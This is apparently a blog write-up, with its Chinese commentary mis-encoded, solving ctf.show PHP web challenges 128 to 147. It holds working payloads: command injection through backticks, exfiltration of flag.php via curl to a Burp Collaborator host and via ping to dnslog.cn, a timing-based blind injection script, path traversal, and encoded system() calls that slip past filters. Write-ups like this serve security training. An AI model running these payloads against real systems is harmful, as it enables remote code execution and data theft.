<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç©ºæ ¼ + . [`ä¼šè¢«è½¬åŒ–ä¸º`_</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctf%20show=ilove36d</span><br></pre></td></tr></table></figure>

<h1 id="Web128"><a href="#Web128" class="headerlink" title="Web128"></a>Web128</h1><p>æ–°çŸ¥è¯†ï¼š</p>
<p>gettext()å‡½æ•°æœ‰ä¸€ä¸ªåˆ«åï¼š<code>_ </code>           gettext()çš„ä½œç”¨å°±æ˜¯è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">_</span>()æ˜¯<span class="title function_ invoke__">gettext</span>()çš„æ‹“å±•å‡½æ•°</span><br><span class="line">åœ¨å¼€å¯ç›¸å…³è®¾å®šåï¼Œ<span class="title function_ invoke__">_</span>(<span class="string">&quot;666&quot;</span>)ç­‰ä»·äº<span class="title function_ invoke__">gettext</span>(<span class="string">&quot;666&quot;</span>)ï¼Œä¸”å°±è¿”å›å…¶ä¸­çš„å‚æ•°</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="number">666</span>);   <span class="comment">//è¾“å‡º 666</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;666&quot;</span>);		<span class="comment">//è¾“å‡º 666</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>get_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: ?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>

<h1 id="Web129"><a href="#Web129" class="headerlink" title="Web129"></a>Web129</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strpos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line">stripos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line">strripos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line">strrpos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜éœ€è¦ä½¿ç”¨ç›®å½•ç©¿è¶Šå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ctfshow/../flag.php</span><br><span class="line">?f=/ctfshow/../../../../../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web130"><a href="#Web130" class="headerlink" title="Web130"></a>Web130</h1><p>ç›´æ¥postä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=ctfshow</span><br></pre></td></tr></table></figure>

<h1 id="Web131"><a href="#Web131" class="headerlink" title="Web131"></a>Web131</h1><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>payloadï¼š<code>?f=ctfshow[]</code></p>
<h4 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h4><p>é‡‡ç”¨<code>æ•°ç»„</code>ç»•è¿‡çš„æ–¹æ³•ï¼Œ<code>striposå‡½æ•°</code>ä¼šè¿”å›<code>null</code>,<code>null!=false</code>,æ‰€ä»¥å¯ä»¥ç»•è¿‡striposå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f[]=666</span><br></pre></td></tr></table></figure>

<h4 id="æ–¹æ³•ä¸‰ï¼š"><a href="#æ–¹æ³•ä¸‰ï¼š" class="headerlink" title="æ–¹æ³•ä¸‰ï¼š"></a>æ–¹æ³•ä¸‰ï¼š</h4><p>å›æº¯æ¬¡æ•°æº¢å‡ºå³å¯</p>
<p>å†™ä¸€ä¸ªè„šæœ¬</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://510d4c1f-2643-4f0e-b2ff-2f62679bf384.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">response=requests.post(url=url,data=&#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;data&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h1 id="Web132"><a href="#Web132" class="headerlink" title="Web132"></a>Web132</h1><p>å¾ˆç®€å•çš„è¿™é¢˜</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span> || <span class="literal">true</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;true!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿”å›ç»“æœä¸ºtrue</span></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªéœ€è¦æ»¡è¶³åè€…å°±è¡Œï¼š<code>$username ===&quot;admin&quot;</code></p>
<p>åŒæ—¶æ»¡è¶³ä¸‹ä¸€ä¸ªifï¼š<code>$code == &#39;admin&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=1&amp;code=admin</span><br></pre></td></tr></table></figure>

<h1 id="Web133"><a href="#Web133" class="headerlink" title="Web133"></a>Web133</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬ä¼ é€’?F=`$F`;+sleep 3å¥½åƒç½‘ç«™ç¡®å®sleepäº†ä¸€ä¼šè¯´æ˜çš„ç¡®æ‰§è¡Œäº†å‘½ä»¤</span><br><span class="line">**é‚£ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ**</span><br><span class="line">å› ä¸ºæ˜¯æˆ‘ä»¬ä¼ é€’çš„`$F`;+sleep 3ã€‚å…ˆè¿›è¡Œsubstr()å‡½æ•°æˆªæ–­ç„¶åå»æ‰§è¡Œeval()å‡½æ•°</span><br><span class="line">è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œphpä»£ç ï¼Œ``æ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™ï¼Œç„¶åå°±å»å‘½ä»¤æ‰§è¡Œã€‚</span><br><span class="line">è€Œ$Få°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„`$F`;+sleep 3 ä½¿ç”¨æœ€åæ‰§è¡Œçš„ä»£ç åº”è¯¥æ˜¯</span><br><span class="line">``$F`;+sleep 3`,å°±æ‰§è¡ŒæˆåŠŸ</span><br><span class="line">è¿™é‡Œå¯èƒ½æœ‰ç‚¹ç»•ï¼Œæ…¢æ…¢ç†è§£</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?F=`$F `;+curl -X POST -F xx=@flag.php 6hokugw3tjr8vdj8f2yldiead1jt7i.burpcollaborator.net</span><br><span class="line"></span><br><span class="line"># -X POST  æŒ‡å®š HTTP è¯·æ±‚çš„æ–¹æ³•ä¸º POST</span><br><span class="line"># å…¶ä¸­-F æ˜¯å¸¦æ–‡ä»¶çš„å½¢å¼å‘é€postè¯·æ±‚</span><br><span class="line"># xxæ˜¯ä¸Šä¼ æ–‡ä»¶çš„nameå€¼ï¼Œflag.phpå°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶ </span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨dnslog</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6d430dd8-2c69-4e3a-80e9-17df7cab12e0.challenge.ctf.show/?F=`$F`; ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.5c7zzo.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡è¿™ç§ç‰¹åˆ«å®¹æ˜“å¤±è´¥ä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</p>
<h1 id="Web134"><a href="#Web134" class="headerlink" title="Web134"></a>Web134</h1><p>æˆ‘ä»¬å¯ä»¥ä¹‹é—´ä½¿ç”¨å˜é‡å»ç»•è¿‡å³å¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure>

<h1 id="Web135"><a href="#Web135" class="headerlink" title="Web135"></a>Web135</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F` ;cp flag.php 666.txt</span><br><span class="line">?F=`$F` ;nl flag.php&gt;666.txt</span><br><span class="line">?F=`$F` ;mv flag.php 666.txt</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä½¿ç”¨cpå‘½ä»¤å°±å¯ä»¥å®Œæˆäº†</p>
<p>æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨pingå‘½ä»¤å¤–å¸¦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F`; ping `nl flag.php|awk &#x27;NR==15&#x27;|tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.qvnuu2.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯è¿™æ ·è¿˜æ˜¯å¾ˆå®¹æ˜“å‡ºä¸æ¥</p>
<h1 id="Web136"><a href="#Web136" class="headerlink" title="Web136"></a>Web136</h1><p>ç›´æ¥ä½¿ç”¨linuxçš„teeå‘½ä»¤å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /|tee 1 è®¿é—®1ä¸‹è½½å‘ç°æ ¹ç›®å½•ä¸‹æœ‰flag payload: cat /f149_15_h3r3|tee 2 è®¿é—®ä¸‹è½½å°±OK</span><br></pre></td></tr></table></figure>

<h1 id="Web137"><a href="#Web137" class="headerlink" title="Web137"></a>Web137</h1><p>è¿™é¢˜ç›´æ¥è°ƒç”¨é™æ€ç±»å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<h1 id="Web138"><a href="#Web138" class="headerlink" title="Web138"></a>Web138</h1><p>åˆ©ç”¨call_user_funcçš„æ€§è´¨å³å¯ï¼Œæˆ‘ä»¬ä¼ é€’ä¸€ä¸ªæ•°ç»„è¿›å»ï¼Œä½¿å…¶è°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class="line">è°ƒç”¨classnameè¿™ä¸ªç±»é‡Œçš„sya_helloæ–¹æ³•</span><br><span class="line"></span><br><span class="line">array[0]=$classname  ç±»å</span><br><span class="line">array[1]=say_hello   say_hello()æ–¹æ³•</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>

<h1 id="Web139"><a href="#Web139" class="headerlink" title="Web139"></a>Web139</h1><p>è¿™é¢˜å°±ç¨å¾®æœ‰ç‚¹éš¾åº¦ï¼Œéœ€è¦ä½¿ç”¨ç›²æ³¨</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># url = &quot;http://7bbfdea8-0683-43fe-a382-62f9db7b00b5.challenge.ctf.show/?c=&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&quot;NR==&#123;&#125;\&quot;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># result = &quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># row = 6</span></span><br><span class="line"><span class="comment"># length = 20</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># strings = &quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for r in range(1,row):</span></span><br><span class="line"><span class="comment">#     for c in range(1,length):</span></span><br><span class="line"><span class="comment">#         for s in strings:</span></span><br><span class="line"><span class="comment">#             target = url+payload.format(c,r,s)</span></span><br><span class="line"><span class="comment">#             try:</span></span><br><span class="line"><span class="comment">#                 requests.get(target,timeout=3)</span></span><br><span class="line"><span class="comment">#             except:</span></span><br><span class="line"><span class="comment">#                 result+=s</span></span><br><span class="line"><span class="comment">#                 print(result)</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     result+=&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7bbfdea8-0683-43fe-a382-62f9db7b00b5.challenge.ctf.show/?c=&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if [ `cat /f149_15_h3r3 | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"></span><br><span class="line">length = <span class="number">48</span></span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">        target = url+payload.<span class="built_in">format</span>(c,s)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(target,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result+=s</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    result+=<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>

<p>æœ€åå°±å¾—åˆ°äº†flag</p>
<h1 id="Web140"><a href="#Web140" class="headerlink" title="Web140"></a>Web140</h1><p><strong><code>0==â€œå­—ç¬¦ä¸²â€</code> è¿”å›çš„æ˜¯TRUE</strong></p>
<p>intvalä¼šå°†éæ•°å­—å­—ç¬¦è½¬æ¢ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´ <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5())</span><br><span class="line">current(localeconv)</span><br><span class="line">sha1(getcwd())     å› ä¸º/var/www/html md5åå¼€å¤´çš„æ•°å­—æ‰€ä»¥æˆ‘ä»¬æ”¹ç”¨sha1</span><br><span class="line">post f1=usleep&amp;f2=usleep</span><br><span class="line">post f1=gmdate&amp;f2=gmdate</span><br><span class="line">post f1=intval&amp;f2=intval</span><br></pre></td></tr></table></figure>

<h1 id="Web141"><a href="#Web141" class="headerlink" title="Web141"></a>Web141</h1><p>è¿™ä¸»è¦æ˜¯å¯ä»¥é€šè¿‡å–åç»•è¿‡</p>
<p>æ‹“å±•ï¼šå„ç§æ— æ•°å­—å­—æ¯ç»•è¿‡<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413%E2%80%98">https://blog.csdn.net/miuzzx/article/details/109143413â€˜</a></p>
<p>ç»•è¿‡returnçš„æ–¹å¼ï¼š<br>phpä¸­æœ‰ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œæ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ 1-phpinfo();ç»“åˆå‡å·æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ã€‚ï¼ˆä¸ä¸€å®šæ˜¯å‡å·ï¼Œè¿˜æœ‰åŠ ã€ä¹˜ã€é™¤å·ï¼Œè‹¥ç”¨åŠ å·ã€‚è¦ç”¨+ï¼Œè¦è¿›è¡ŒURLç¼–ç ï¼Œè¿™æ˜¯ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä¸è¿›è¡Œç¼–ç ä¼šå½“ä½œç©ºæ ¼ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system(tac f*);</span><br><span class="line">ç»è¿‡å–åå¤„ç†</span><br><span class="line">(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);</span><br><span class="line">payloadï¼š</span><br><span class="line">?v1=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&amp;v2=1</span><br><span class="line"></span><br><span class="line">?v1=1&amp;v2=2&amp;v3=-(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)-</span><br></pre></td></tr></table></figure>

<h1 id="Web142"><a href="#Web142" class="headerlink" title="Web142"></a>Web142</h1><p>ç›´æ¥ä¼ 0å°±è¡Œäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?v1=0   	å…«è¿›åˆ¶</span><br><span class="line">?v1=0x0		16è¿›åˆ¶</span><br><span class="line">?v1=0e123	ç§‘å­¦è®¡æ•°æ³•</span><br></pre></td></tr></table></figure>

<h1 id="Web143"><a href="#Web143" class="headerlink" title="Web143"></a>Web143</h1><p>è¿™é¢˜æ˜¯141çš„å‡çº§ç‰ˆï¼Œæˆ‘ä»¬ç”¨å¼‚æˆ–å³å¯ã€‚</p>
<p>å¹¶ä¸”æ²¡æœ‰è¿‡æ»¤ä¹˜å·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=2&amp;v3=*(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%02%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2c%60%60%60&quot;)?&gt;</span><br><span class="line"></span><br><span class="line">?v1=1&amp;v2=2&amp;v3=-(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)-</span><br></pre></td></tr></table></figure>

<h1 id="Web144"><a href="#Web144" class="headerlink" title="Web144"></a>Web144</h1><p>ç›´æ¥æ¢ä¸ªä½ç½®å°±è¡Œäº†è¿™é¢˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v3=-&amp;v2=(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)</span><br></pre></td></tr></table></figure>

<h1 id="Web145"><a href="#Web145" class="headerlink" title="Web145"></a>Web145</h1><p>å¯ä»¥ä½¿ç”¨å†’å·é—®å·è¿æ¥</p>
<p>æµ‹è¯•ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯å¯ä»¥è¿è¡Œå‡ºæ¥çš„</p>
<p>æ‰€ä»¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=%0a1&amp;v2=%0a0&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5):</span><br></pre></td></tr></table></figure>

<h1 id="Web146"><a href="#Web146" class="headerlink" title="Web146"></a>Web146</h1><p>åˆå¢åŠ äº†åˆ†å·çš„è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡æ³•ç”¨ä¸‰ç›®è¿ç®—ç¬¦äº†ï¼Œè¿™æ—¶å€™æƒ³åˆ°äº†ç­‰å·å’Œä½è¿ç®—ç¬¦</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­å¥—å°±è¡Œ</p>
<h1 id="Web147"><a href="#Web147" class="headerlink" title="Web147"></a>Web147</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/iä¸åŒºåˆ†å¤§å°å†™</span><br><span class="line">/såŒ¹é…ä»»ä½•ä¸å¯è§å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ï¼Œç­‰ä»·äº[\f\n\r\t\v]</span><br><span class="line">/Då¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ</span><br></pre></td></tr></table></figure>

<p>ç”±äºå‘½åç©ºé—´é—®é¢˜ï¼Œå¦‚æœè¦ç»å¯¹è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œä¾‹å¦‚systemï¼Œé‚£ä¹ˆå°±è¦å†™æˆ<code>\system</code></p>
<p>phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯ å¾„ï¼› è€Œå¦‚æœå†™\function_name()è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™ æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?show=;&#125;;phpinfo();/*</span><br><span class="line">ctf=\create_function</span><br></pre></td></tr></table></figure>

<p>ç´§æ¥ç€å°±åˆ°äº†å¦‚ä½•åªæ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°æ¥æ‰§è¡Œå‘½ä»¤çš„é—®é¢˜äº†ï¼Œåæ¥æ‰¾åˆ°å¯ä»¥ç”¨<code>create_function</code>æ¥å®Œæˆï¼Œ<code>create_function</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å†…å®¹ã€‚</p>
<p>å‡½æ•°ç»“æ„å½¢ä¼¼</p>
